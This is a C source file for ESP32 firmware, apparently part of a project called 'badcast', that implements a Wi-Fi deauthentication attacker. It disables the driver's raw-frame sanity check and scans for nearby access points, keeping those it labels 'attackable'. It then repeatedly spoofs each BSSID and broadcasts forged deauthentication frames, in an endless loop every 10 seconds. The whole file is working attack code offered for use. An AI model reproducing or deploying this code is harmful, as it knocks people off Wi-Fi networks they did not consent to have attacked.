#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_mac.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_err.h"

#include "config.h"

static const char *TAG = "badcast_deauther";

/**
 * @brief Deauthentication frame template
 * 
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 * Source: https://github.com/risinek/esp32-wifi-penetration-tool
 * 
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauthFrameDefault[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

/**
 * @brief Decomplied function that overrides original one at compilation time.
 * 
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    return 0;
}

typedef struct {
    uint8_t bssid[6];                     /**< MAC address of AP */
    uint8_t primary;                      /**< channel of AP */
    wifi_second_chan_t second;            /**< secondary channel of AP */
} ap_record;  // lite version of wifi_ap_record_t

void send_deauth_frame(ap_record *target)
{
    // clone BSSID and channels first
    ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_STA, target->bssid));
    ESP_ERROR_CHECK(esp_wifi_set_channel(target->primary, target->second));

    uint8_t deauthFrame[sizeof(deauthFrameDefault)];
    memcpy(deauthFrame, deauthFrameDefault, sizeof(deauthFrameDefault));
    memcpy(&deauthFrame[10], target->bssid, 6);
    memcpy(&deauthFrame[16], target->bssid, 6);

    for (uint8_t i = 0; i < 5; i++) {
        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrameDefault), false);
        if (ret) {
            ESP_LOGW(TAG, "failed to send deauth frame, err: %d", ret);
            return;
        }
    }
    ESP_LOGI(TAG, "sent deauth frames as "MACSTR, MAC2STR(target->bssid));
}

#define DEFAULT_SCAN_LIST_SIZE 6  // out of memory if > 6

uint8_t scan_ap(ap_record *targets)
{
    uint16_t number = DEFAULT_SCAN_LIST_SIZE;
    wifi_ap_record_t apInfo[DEFAULT_SCAN_LIST_SIZE];
    uint16_t apCount = 0;
    memset(apInfo, 0, sizeof(apInfo));

    esp_wifi_scan_start(NULL, true);
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&number, apInfo));
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&apCount));
    esp_wifi_scan_stop();

    uint8_t attackableCount = 0;
    for (int i = 0; (i < DEFAULT_SCAN_LIST_SIZE) && (i < apCount); i++) {
        if (apInfo[i].authmode == WIFI_AUTH_WPA2_ENTERPRISE ||
            apInfo[i].authmode == WIFI_AUTH_WPA3_PSK) continue;  // skip secured ones
        memcpy(targets[attackableCount].bssid, apInfo[i].bssid, 6);
        targets[attackableCount].primary = apInfo[i].primary;
        targets[attackableCount].second = apInfo[i].second;
        attackableCount++;
    }
    ESP_LOGI(TAG, "attackable APs = %u / %u", attackableCount, apCount);
    return attackableCount;
}

void deauth(void *arg)
{
    while (1) {
        // save AP channel
        uint8_t chPrimary;
        wifi_second_chan_t chSecond;
        ESP_ERROR_CHECK(esp_wifi_get_channel(&chPrimary, &chSecond));

        ap_record targets[DEFAULT_SCAN_LIST_SIZE];
        uint8_t apCount = scan_ap(targets);
        for (uint8_t i = 0; (i < DEFAULT_SCAN_LIST_SIZE) && (i < apCount); i++) {
            send_deauth_frame(&targets[i]);
        }

        // restore AP channel
        ESP_ERROR_CHECK(esp_wifi_set_channel(chPrimary, chSecond));

        ESP_LOGI(TAG, "free heap: %u", esp_get_free_heap_size());
        vTaskDelay(10000 / portTICK_PERIOD_MS);
    }
}

void start_deauther_task(void)
{
    xTaskCreate(deauth, "deauther", TASK_STACK_SIZE, NULL, 11, NULL);
}